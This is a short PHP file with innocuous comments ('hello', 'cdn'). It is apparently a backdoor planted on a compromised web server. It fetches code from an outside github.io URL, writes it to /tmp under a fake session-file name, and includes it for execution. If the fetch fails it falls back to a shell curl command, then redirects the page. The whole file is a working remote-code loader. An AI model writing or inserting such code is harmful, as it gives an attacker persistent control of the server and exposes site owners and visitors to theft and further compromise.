<?php
# hello
# cdn
# cdn

$URL = 'https://blank03072000.github.io/home.txt';	# hacked
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!

function M() {
	$FGT = @file_get_contents($GLOBALS['URL']);
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
	echo '<script>window.location="?hi";</script>';
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>